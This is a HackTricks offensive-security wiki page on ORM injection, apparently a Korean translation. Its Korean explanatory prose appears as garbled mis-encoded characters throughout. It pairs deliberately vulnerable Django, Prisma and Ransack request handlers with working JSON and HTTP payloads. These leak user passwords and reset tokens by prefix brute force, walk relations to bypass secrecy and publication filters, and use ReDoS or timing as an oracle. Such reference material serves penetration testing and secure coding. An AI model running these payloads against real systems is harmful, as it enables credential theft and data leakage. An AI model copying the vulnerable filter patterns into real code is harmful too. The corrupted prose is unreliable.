# ORM Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Django ORM (Python)

[**ì´ ê²Œì‹œë¬¼**](https://www.elttam.com/blog/plormbing-your-django-orm/)ì—ì„œëŠ” ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ Django ORMì„ ì·¨ì•½í•˜ê²Œ ë§Œë“œëŠ” ë°©ë²•ì„ ì„¤ëª…í•©ë‹ˆë‹¤:

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
ì‚¬ìš©ìê°€ ê¸°ì‚¬ ê²€ìƒ‰ì„ ìœ„í•´ ìš”ì²­ì„ ë³´ë‚´ëŠ” ê¸°ë³¸ API ë·°
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

ëª¨ë“  request.data(ì´ëŠ” jsonì´ ë  ê²ƒì…ë‹ˆë‹¤)ê°€ **ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ê°ì²´ë¥¼ í•„í„°ë§í•˜ëŠ” ë° ì§ì ‘ ì „ë‹¬ë˜ëŠ” ë°©ì‹ì— ì£¼ëª©í•˜ì‹­ì‹œì˜¤**. ê³µê²©ìëŠ” ì˜ˆìƒë³´ë‹¤ ë” ë§ì€ ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•´ ì˜ˆìƒì¹˜ ëª»í•œ í•„í„°ë¥¼ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆì‹œ:

* **ë¡œê·¸ì¸:** ê°„ë‹¨í•œ ë¡œê·¸ì¸ì—ì„œ ë‚´ë¶€ì— ë“±ë¡ëœ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìœ ì¶œí•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ì—¬ ìœ ì¶œë  ë•Œê¹Œì§€ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

* **ê´€ê³„ í•„í„°ë§**: ì˜ˆìƒì¹˜ë„ ëª»í•œ ì—´ì—ì„œ ì •ë³´ë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•´ ê´€ê³„ë¥¼ íƒìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒê³¼ ê°™ì€ ê´€ê³„ë¥¼ ê°€ì§„ ì‚¬ìš©ìê°€ ìƒì„±í•œ ê¸°ì‚¬ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆë‹¤ë©´: Article(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
ëª¨ë“  ì‚¬ìš©ìê°€ ìƒì„±í•œ ê¸°ì‚¬ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
{% endhint %}

* **ë‹¤ëŒ€ë‹¤ ê´€ê³„ í•„í„°ë§**: ì´ì „ ì˜ˆì œì—ì„œëŠ” ê¸°ì‚¬ë¥¼ ìƒì„±í•˜ì§€ ì•Šì€ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì°¾ì„ ìˆ˜ ì—†ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë‹¤ë¥¸ ê´€ê³„ë¥¼ ë”°ë¼ê°€ë©´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: Article(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
ì´ ê²½ìš°, ìš°ë¦¬ëŠ” ê¸°ì‚¬ë¥¼ ì‘ì„±í•œ ì‚¬ìš©ìë“¤ì´ ì†í•œ ë¶€ì„œì˜ ëª¨ë“  ì‚¬ìš©ìë¥¼ ì°¾ê³  ê·¸ë“¤ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì´ì „ jsonì—ì„œëŠ” ì‚¬ìš©ì ì´ë¦„ë§Œ ìœ ì¶œí•˜ê³  ìˆì§€ë§Œ, ì´í›„ì—ëŠ” ë¹„ë°€ë²ˆí˜¸ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
{% endhint %}

* **ì‚¬ìš©ìì™€ì˜ ë‹¤ëŒ€ë‹¤ ê´€ê³„ì—ì„œ Django ê·¸ë£¹ ë° ê¶Œí•œ ë‚¨ìš©**: ê²Œë‹¤ê°€, AbstractUser ëª¨ë¸ì€ Djangoì—ì„œ ì‚¬ìš©ìë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©ë˜ë©°, ê¸°ë³¸ì ìœ¼ë¡œ ì´ ëª¨ë¸ì€ **Permission ë° Group í…Œì´ë¸”ê³¼ì˜ ë‹¤ëŒ€ë‹¤ ê´€ê³„**ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **ê°™ì€ ê·¸ë£¹ì— ìˆê±°ë‚˜ ë™ì¼í•œ ê¶Œí•œì„ ê³µìœ í•˜ëŠ” ê²½ìš° í•œ ì‚¬ìš©ìì—ì„œ ë‹¤ë¥¸ ì‚¬ìš©ìì— ì ‘ê·¼í•˜ëŠ” ê¸°ë³¸ì ì¸ ë°©ë²•**ì…ë‹ˆë‹¤.
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **í•„í„° ì œí•œ ìš°íšŒ**: ë™ì¼í•œ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼ì€ `articles = Article.objects.filter(is_secret=False, **request.data)`ì™€ ê°™ì€ ì¼ë¶€ í•„í„°ë§ì„ ìš°íšŒí•  ê²ƒì„ ì œì•ˆí–ˆìŠµë‹ˆë‹¤. is\_secret=Trueì¸ ê¸°ì‚¬ë¥¼ ë¤í”„í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë©°, ê´€ê³„ì—ì„œ Article í…Œì´ë¸”ë¡œ ë‹¤ì‹œ ë£¨í”„ë¥¼ ëŒ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë¹„ë°€ ê¸°ì‚¬ë¥¼ ë¹„ë°€ì´ ì•„ë‹Œ ê¸°ì‚¬ì—ì„œ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ê°€ ì¡°ì¸ë˜ê³  is\_secret í•„ë“œê°€ ë¹„ë°€ì´ ì•„ë‹Œ ê¸°ì‚¬ì—ì„œ í™•ì¸ë˜ëŠ” ë™ì•ˆ ë¹„ë°€ ê¸°ì‚¬ì—ì„œ ë°ì´í„°ê°€ ìœ ì¶œë©ë‹ˆë‹¤.
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
ê´€ê³„ë¥¼ ì•…ìš©í•˜ë©´ í‘œì‹œë˜ëŠ” ë°ì´í„°ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•œ í•„í„°ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

* **ì˜¤ë¥˜/ì‹œê°„ ê¸°ë°˜ ReDoSë¥¼ í†µí•œ**: ì´ì „ ì˜ˆì œì—ì„œëŠ” í•„í„°ë§ì´ ì‘ë™í•˜ëŠ”ì§€ ì—¬ë¶€ì— ë”°ë¼ ë‹¤ë¥¸ ì‘ë‹µì„ ê¸°ëŒ€í–ˆìœ¼ë©°, ì´ë¥¼ ì˜¤ë¼í´ë¡œ ì‚¬ìš©í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ì–´ë–¤ ì‘ì—…ì´ ìˆ˜í–‰ë˜ê³  ì‘ë‹µì´ í•­ìƒ ë™ì¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì˜¤ë¥˜ë¥¼ ë°œìƒì‹œì¼œ ìƒˆë¡œìš´ ì˜¤ë¼í´ì„ ì–»ì„ ìˆ˜ ìˆì„ ê²ƒì…ë‹ˆë‹¤.
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
* **SQLite**: ê¸°ë³¸ì ìœ¼ë¡œ regexp ì—°ì‚°ìê°€ ì—†ìŒ (ì„œë“œíŒŒí‹° í™•ì¥ ë¡œë“œ í•„ìš”)
* **PostgreSQL**: ê¸°ë³¸ regex íƒ€ì„ì•„ì›ƒì´ ì—†ìœ¼ë©° ë°±íŠ¸ë˜í‚¹ì— ëœ ì·¨ì•½í•¨
* **MariaDB**: regex íƒ€ì„ì•„ì›ƒì´ ì—†ìŒ

## Prisma ORM (NodeJS)

ë‹¤ìŒì€ [**ì´ ê²Œì‹œë¬¼ì—ì„œ ì¶”ì¶œí•œ íŠ¸ë¦­**](https://www.elttam.com/blog/plorming-your-primsa-orm/)ì…ë‹ˆë‹¤.

* **ì „ì²´ ì°¾ê¸° ì œì–´**:

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// Attacker has full control of all prisma options
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

ì „ì²´ ìë°”ìŠ¤í¬ë¦½íŠ¸ ë³¸ë¬¸ì´ prismaì— ì „ë‹¬ë˜ì–´ ì¿¼ë¦¬ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì›ë˜ ê²Œì‹œë¬¼ì˜ ì˜ˆì—ì„œ, ì´ëŠ” ëˆ„êµ°ê°€ì— ì˜í•´ ìƒì„±ëœ ëª¨ë“  ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ë©° (ê° ê²Œì‹œë¬¼ì€ ëˆ„êµ°ê°€ì— ì˜í•´ ìƒì„±ë¨) ê·¸ ëˆ„êµ°ê°€ì˜ ì‚¬ìš©ì ì •ë³´ (ì‚¬ìš©ì ì´ë¦„, ë¹„ë°€ë²ˆí˜¸ ë“±)ë„ ë°˜í™˜í•©ë‹ˆë‹¤.
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
ë‹¤ìŒì€ ë¹„ë°€ë²ˆí˜¸ê°€ ìˆëŠ” ì‚¬ìš©ìê°€ ìƒì„±í•œ ëª¨ë“  ê²Œì‹œë¬¼ì„ ì„ íƒí•˜ê³  ë¹„ë°€ë²ˆí˜¸ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤:
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **ì „ì²´ where ì ˆ ì œì–´**:

ê³µê²©ìê°€ `where` ì ˆì„ ì œì–´í•  ìˆ˜ ìˆëŠ” ê²½ìš°ë¥¼ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // ORM Leakì— ì·¨ì•½
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì§ì ‘ í•„í„°ë§í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
`startsWith`ì™€ ê°™ì€ ì—°ì‚°ì„ ì‚¬ìš©í•˜ë©´ ì •ë³´ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&#x20;
{% endhint %}

* **ë‹¤ëŒ€ë‹¤ ê´€ê³„ í•„í„°ë§ ìš°íšŒ:**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
`Category` -\[\*..\*]-> `Article` ê°„ì˜ ë‹¤ëŒ€ë‹¤ ê´€ê³„ë¥¼ í†µí•´ ê²Œì‹œë˜ì§€ ì•Šì€ ê¸°ì‚¬ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
ëª¨ë“  ì‚¬ìš©ìë¥¼ ìœ ì¶œí•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•˜ë‹¤, ì¼ë¶€ ë£¨í”„ë°± ë‹¤ëŒ€ë‹¤ ê´€ê³„ë¥¼ ì•…ìš©í•˜ì—¬:
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **Error/Timed queries**: ì›ë³¸ ê²Œì‹œë¬¼ì—ì„œëŠ” ì‹œê°„ ê¸°ë°˜ í˜ì´ë¡œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì •ë³´ë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•œ ìµœì ì˜ í˜ì´ë¡œë“œë¥¼ ì°¾ê¸° ìœ„í•´ ìˆ˜í–‰ëœ ë§¤ìš° ê´‘ë²”ìœ„í•œ í…ŒìŠ¤íŠ¸ ì„¸íŠ¸ë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ”:
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Where the `{CONTAINS_LIST}`ëŠ” ì˜¬ë°”ë¥¸ leakì´ ë°œê²¬ë˜ì—ˆì„ ë•Œ **ì‘ë‹µì´ ì§€ì—°ë˜ë„ë¡ í•˜ê¸° ìœ„í•´ 1000ê°œì˜ ë¬¸ìì—´ë¡œ êµ¬ì„±ëœ ëª©ë¡ì…ë‹ˆë‹¤.**

## **Ransack (Ruby)**

ì´ëŸ¬í•œ íŠ¸ë¦­ì€ [**ì´ ê²Œì‹œë¬¼ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤**](https://positive.security/blog/ransack-data-exfiltration)**.**

{% hint style="success" %}
**Ransack 4.0.0.0ì€ ì´ì œ ê²€ìƒ‰ ê°€ëŠ¥í•œ ì†ì„±ê³¼ ì—°ê´€ì„±ì— ëŒ€í•´ ëª…ì‹œì ì¸ í—ˆìš© ëª©ë¡ ì‚¬ìš©ì„ ê°•ì œí•©ë‹ˆë‹¤.**
{% endhint %}

**ì·¨ì•½í•œ ì˜ˆ:**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
ì°¸ê³ ë¡œ ì¿¼ë¦¬ëŠ” ê³µê²©ìê°€ ë³´ë‚¸ ë§¤ê°œë³€ìˆ˜ì— ì˜í•´ ì •ì˜ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒê³¼ ê°™ì´ ë¦¬ì…‹ í† í°ì„ ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤:
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
ë¬´ì°¨ë³„ ëŒ€ì… ê³µê²©ê³¼ ì ì¬ì ì¸ ê´€ê³„ë¥¼ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë” ë§ì€ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.

## References

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
